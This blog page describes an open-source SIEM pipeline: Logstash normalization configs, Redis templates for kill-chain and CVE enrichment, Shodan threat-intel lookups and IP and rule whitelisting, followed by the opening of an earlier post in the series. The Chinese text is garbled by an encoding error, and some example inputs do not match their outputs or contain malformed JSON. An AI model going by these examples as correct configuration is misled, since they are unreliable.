<h1 id="SIEM-v0-3-çš„æ”¹è¿›"><a href="#SIEM-v0-3-çš„æ”¹è¿›" class="headerlink" title="SIEM v0.3 çš„æ”¹è¿›"></a>SIEM v0.3 çš„æ”¹è¿›</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>XXX</p>
<hr>
<h2 id="2-Normalized"><a href="#2-Normalized" class="headerlink" title="2. Normalized"></a>2. Normalized</h2><h3 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220218183243830](/Users/canon/Library/Application Support/typora-user-images/image-20220218183243830.png)</p>
<h3 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>60_normalized-general.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>61_normalized-alert.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>62_normalized-flow.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>63_normalized-fileinfo.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>64_normalized-http.conf</td>
<td>64_normalized-http.rb</td>
<td>64_normalized-http.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>65_normalized-tls.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="3-Enrichment"><a href="#3-Enrichment" class="headerlink" title="3. Enrichment"></a>3. Enrichment</h2><h3 id="Workflow-1"><a href="#Workflow-1" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221134544143](/Users/canon/Library/Application Support/typora-user-images/image-20220221134544143.png)</p>
<h3 id="Configure-1"><a href="#Configure-1" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>70_enrichment-general-geo-1-private_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>70_enrichment-general-geo-2-public_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>71_enrichment-alert-1-direction.conf</td>
<td>71_enrichment-alert-1-direction.rb</td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>71_enrichment-alert-2-killChain.conf</td>
<td>71_enrichment-alert-2-killChain.rb</td>
<td>71_enrichment-alert-2-killChain.log</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>71_enrichment-alert-3-cve.conf</td>
<td>71_enrichment-alert-3-cve.rb</td>
<td>71_enrichment-alert-3-cve.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>71_enrichment-alert-4-whitelist_ip.conf</td>
<td>71_enrichment-alert-4-whitelist_ip.rb</td>
<td>71_enrichment-alert-4-whitelist_ip.log</td>
<td>****</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="KillChain"><a href="#KillChain" class="headerlink" title="KillChain"></a>KillChain</h4><h5 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h5><p><strong>Imput</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str killchain:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;steps&quot;=&gt;&#123;KillChain steps&#125;, &quot;description&quot;=&gt;&#123;KillChain description&#125;, &quot;class&quot;=&gt;&#123;rule class&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> killchain:suricata:2028933 <span class="string">&#x27;&#123;&quot;steps&quot;: 4, &quot;description&quot;: &quot;Exploitation&quot;, &quot;class&quot;=&gt;exploit&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;killchain&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;steps&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;ä¾¦æŸ¥è·Ÿè¸ª&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;class&quot;</span>: <span class="string">&quot;scan&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a>Imperva</h5><h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str enrichment:&#123;class&#125;:&#123;cve&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;create time create user&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> enrichment:cve:CVE-2016-8618 <span class="string">&#x27;2022-02-16 Canon&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;rule&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;cve&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span> <span class="comment">// none</span></span><br><span class="line">    &#125;,</span><br><span class="line">  	<span class="attr">&quot;vulnerability&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;enumeration&quot;</span>: <span class="string">&quot;CVE&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-ThreatIntel"><a href="#4-ThreatIntel" class="headerlink" title="4. ThreatIntel"></a>4. ThreatIntel</h2><h3 id="Workflow-2"><a href="#Workflow-2" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221105601713](/Users/canon/Library/Application Support/typora-user-images/image-20220221105601713.png)</p>
<h3 id="Configure-2"><a href="#Configure-2" class="headerlink" title="Configure"></a>Configure</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>85_threatintel-siem-event-1-shodan.conf</td>
<td>85_threatintel-siem-event-1-shodan.rb</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: list spider:&#123;provider&#125;:ioc</span></span><br><span class="line"><span class="comment"># value: str ioc</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; LPUSH spider:shodan:ioc 8.8.8.8 <span class="comment"># Spider Queue</span></span><br><span class="line">localhost:6379&gt; SETEX alert:8.8.8.8 86400 <span class="literal">true</span> <span class="comment"># IoC Cache</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;84.17.52.20&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;tcp&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">81</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">8080</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">8081</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">8443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">9002</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">&quot;udp&quot;</span>: []</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: <span class="string">&quot;cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: <span class="string">&quot;unn-84-17-52-20.cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8443</span>,</span><br><span class="line">                <span class="number">8081</span>,</span><br><span class="line">                <span class="number">9002</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">81</span>,</span><br><span class="line">                <span class="number">443</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;https&quot;</span>,</span><br><span class="line">                <span class="string">&quot;https-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Filter"><a href="#3-Filter" class="headerlink" title="3. Filter"></a>3. Filter</h2><h3 id="3-1-Whitelist"><a href="#3-1-Whitelist" class="headerlink" title="3.1 Whitelist"></a>3.1 Whitelist</h3><h4 id="3-1-1-IP"><a href="#3-1-1-IP" class="headerlink" title="3.1.1 IP"></a>3.1.1 IP</h4><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;ip&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass|drop&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:ip:8.8.8.8 <span class="string">&#x27;&#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>, <span class="comment">// æè¿°ç™½åå•ç±»å‹ï¼Œå¦‚ï¼šCDNã€çº¢é˜Ÿæµ‹è¯•IPã€åŠå…¬ç½‘å‡ºå£IP</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>, <span class="comment">// drop|pass äº‹ä»¶æ˜¯å¦éœ€è¦è¿›å…¥SIEMæ¶ˆè´¹</span></span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span> <span class="comment">// source|destination æè¿°å®é™…åŒ¹é…åˆ°ç™½åå•æ¥æºæ˜¯&quot;source&quot;è¿˜æ˜¯&quot;destination&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span> <span class="comment">// ä»…ä½œä¸ºç­›é€‰æ¡ä»¶</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Differences</strong></p>
<ul>
<li>v0.2</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;destination.&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>v0.3</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-1-2-Rule"><a href="#3-1-2-Rule" class="headerlink" title="3.1.2 Rule"></a>3.1.2 Rule</h4><h5 id="3-1-2-1-SID"><a href="#3-1-2-1-SID" class="headerlink" title="3.1.2.1 SID"></a>3.1.2.1 SID</h5><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;rule name&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:sid:suricata:2101201 <span class="string">&quot;GPLWEB_SERVER_403_Forbidden&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224143316558](/Users/canon/Library/Application Support/typora-user-images/image-20220224143316558.png)</p>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule name&#125;</span></span><br><span class="line"><span class="comment"># value: str add by &#123;user&#125; &#123;date&#125; &#123;sid&#125; # default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Suricata</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:suricata:GPLWEB_SERVER_403_Forbidden&quot;</span> <span class="string">&quot;add by Canon 2022.02.24 2101201&quot;</span></span><br><span class="line"><span class="comment"># Imperva</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:imperva:Suspicious Response Code&quot;</span> <span class="string">&quot;add by Canon 2022.02.24&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224150916372](/Users/canon/Library/Application Support/typora-user-images/image-20220224150916372.png)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">è‡´æˆ‘å¿ƒä¸­çš„ â€œæ•£è£…â€ï¼ˆå¼€æºï¼‰SIEMï¼ˆä¸€ï¼‰</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-02-02 16:55:52" itemprop="dateCreated datePublished" datetime="2021-02-02T16:55:52+08:00">2021-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-10-24 10:15:49" itemprop="dateModified" datetime="2023-10-24T10:15:49+08:00">2023-10-24</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>33k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>30 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>â€‹        ç”±äºå·¥ä½œæ¯”è¾ƒå¿™ï¼Œæœ‰æ®µæ—¶é—´æ²¡æœ‰æ›´äº†ï¼Œå¿«åˆ°å¹´åº•äº†ï¼Œå°±å½“æ˜¯æ€»ç»“äº†ã€‚ä»Šå¹´ä¸»è¦ç²¾åŠ›éƒ½æ˜¯åœ¨å›´ç»•ç€å®‰å…¨è¿è¥è¿™ä¸€å—çš„å·¥ä½œï¼Œéšç€å·¥ä½œçš„å¼€å±•å‘ç°è‡ªå·±<strong>â€œç»„è£…â€</strong>çš„SIEMç”¨èµ·æ¥ä¸æ˜¯å¾ˆâ€œ<strong>èˆ’æœ</strong>â€ã€‚è¿™æ˜¯æˆ‘ä¹‹å‰å†™çš„ä¸€ç¯‡ã€Š<a target="_blank" rel="noopener" href="https://canon88.github.io/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/"><strong>Wazuh-å¦‚ä½•å¯¹å¼‚æ„æ•°æ®è¿›è¡Œå…³è”å‘Šè­¦</strong></a>ã€‹çš„æ–‡ç« ï¼Œå½“æ—¶è§„åˆ’çš„æ•°æ®æµçš„Workflowå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/image-20200303215020561.png" alt="image-20200303215020561"></p>
<p>â€‹        <strong>â€œæ•£è£…â€SIEM</strong>ä¸»è¦æ˜¯å»ºç«‹åœ¨ELKçš„æ¡†æ¶ä¹‹ä¸Šï¼Œå‘Šè­¦æ¨¡å—åˆ†åˆ«é‡‡ç”¨äº†Wazuhä¸Elastalertã€‚æ—©æœŸä¸ºäº†ä½¿Wazuhèƒ½å¤Ÿæ¶ˆè´¹å¼‚æ„æ•°æ®<strong>ï¼ˆWAFã€NTAã€EDRï¼‰</strong>å¹¶è¿›è¡Œå…³è”å‘Šè­¦ï¼Œæˆ‘åœ¨æ•°æ®å…¥åº“ä¹‹å‰åˆ©ç”¨Logstashå¯¹å¼‚æ„æ•°æ®è¿›è¡Œäº†æ ‡å‡†åŒ–ï¼ŒåŒæ—¶Wazuhå¯¹æ ‡å‡†åŒ–åçš„æ•°æ®è¿›è¡Œå…³è”ã€‚ä¾‹å¦‚ï¼šSuricataé€šè¿‡Filebeatå°†å‘Šè­¦äº‹ä»¶å‘å‡ºï¼Œç”±Logstashç»Ÿä¸€è¿›è¡Œæ ‡å‡†åŒ–å¤„ç†å¹¶åŒæ—¶è¾“å‡ºåˆ°Elasticä»¥åŠWazuhã€‚å…¶ä¸­Elasticä¸ºå‘Šè­¦çš„å…ƒæ•°æ®ï¼Œæ¨é€åˆ°Wazuhä¸Šçš„ä¸ºæ ‡å‡†åŒ–åçš„å®‰å…¨äº‹ä»¶ã€‚</p>
<hr>
<h1 id="â€œæ•£è£…â€SIEM-v0-1çš„ä¸è¶³ä¸æ”¹è¿›æªæ–½"><a href="#â€œæ•£è£…â€SIEM-v0-1çš„ä¸è¶³ä¸æ”¹è¿›æªæ–½" class="headerlink" title="â€œæ•£è£…â€SIEM v0.1çš„ä¸è¶³ä¸æ”¹è¿›æªæ–½"></a>â€œæ•£è£…â€SIEM v0.1çš„ä¸è¶³ä¸æ”¹è¿›æªæ–½</h1><h2 id="1-æ•°æ®æ ‡å‡†åŒ–"><a href="#1-æ•°æ®æ ‡å‡†åŒ–" class="headerlink" title="1. æ•°æ®æ ‡å‡†åŒ–"></a>1. æ•°æ®æ ‡å‡†åŒ–</h2><p>â€‹        ç”±äºå‰æœŸçš„æ ‡å‡†åŒ–æœªé‡‡ç”¨**<a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/ecs/current/ecs-reference.html">ECS</a>**(<strong>Elastic Common Schema</strong>)ï¼Œå¯¼è‡´åæœŸæ²¿ç”¨Elasticç”Ÿæ€çš„æ—¶å€™å‡ºç°äº†ä½¿ç”¨ä¸Šçš„ä¸ä¾¿ã€‚å¤§å®¶éƒ½çŸ¥é“ESåœ¨7.Xçš„ç‰ˆæœ¬æ¨å‡ºäº†SIEMè¿™ä¸ªåŠŸèƒ½ï¼Œå¦‚æœæƒ³ä½¿ç”¨Elastic SIEMè¿›è¡Œåˆ†æçš„è¯ï¼Œé‚£ä¹ˆECSæ˜¯é¦–é€‰ã€‚è¿™é‡Œä¸ºäº†åæœŸä¸å¼€æºç”Ÿæ€æ›´å¥½çš„è¿›è¡Œèåˆï¼Œéœ€è¦å°†åŸå…ˆçš„æ ‡å‡†åŒ–è½¬ä¸ºECSçš„æ ¼å¼ã€‚</p>
<h2 id="2-å‘Šè­¦ä¸°å¯ŒåŒ–"><a href="#2-å‘Šè­¦ä¸°å¯ŒåŒ–" class="headerlink" title="2. å‘Šè­¦ä¸°å¯ŒåŒ–"></a>2. å‘Šè­¦ä¸°å¯ŒåŒ–</h2><p>ä¸ºäº†æ›´æœ‰æ•ˆçš„æå‡å‘Šè­¦è´¨é‡ï¼Œæé«˜å®‰å…¨åˆ†æçš„æ•ˆç‡ã€‚éœ€è¦å¯¹å…¥åº“çš„å®‰å…¨äº‹ä»¶ä»¥åŠäº§ç”Ÿçš„å‘Šè­¦è¿›è¡Œå¿…è¦çš„ä¸°å¯ŒåŒ–ã€‚</p>
<ul>
<li><p>åˆ©ç”¨CMDBå¹³å°çš„æ•°æ®å¯¹å†…éƒ¨èµ„äº§è¿›è¡Œä¸°å¯ŒåŒ–ã€‚ä¾‹å¦‚å¢åŠ ï¼šéƒ¨é—¨ã€ä¸šåŠ¡ã€åº”ç”¨ç±»å‹ã€è´Ÿè´£äººç­‰å­—æ®µã€‚</p>
</li>
<li><p>å¯¹æ¥å¨èƒæƒ…æŠ¥æ•°æ®ï¼ŒSIEMä¼šå¯¹å‘Šè­¦äº‹ä»¶çš„æ”»å‡»IPè¿›è¡Œæƒ…æŠ¥ä¾§æ•°æ®çš„ä¸°å¯ŒåŒ–ï¼›</p>
<ul>
<li>æœ¬åœ°å¨èƒæƒ…æŠ¥ï¼ˆæ›¾ç»æ”»å‡»è¿‡æˆ‘ä»¬çš„IPåœ°å€ï¼‰</li>
<li>ç¬¬ä¸‰æ–¹å¨èƒæƒ…æŠ¥<ul>
<li>å¼€æº</li>
<li>å•†ä¸š</li>
</ul>
</li>
</ul>
</li>
<li><p>æ•æ„Ÿæ¥å£ç›‘æ§ï¼ˆå¦‚ï¼šç™»å½•æ¥å£ã€æ”¯ä»˜æ¥å£ã€é’±åŒ…æ¥å£ï¼‰ã€‚åˆ©ç”¨ç¬¬ä¸‰æ–¹æ•°æ®å¯¹IPåœ°å€è¿›è¡ŒProxyæ ‡è®°ï¼Œä¸ºåæœŸé£æ§çš„ç ”åˆ¤æä¾›ä¸€äº›æ•°æ®æ”¯æ’‘ï¼›</p>
</li>
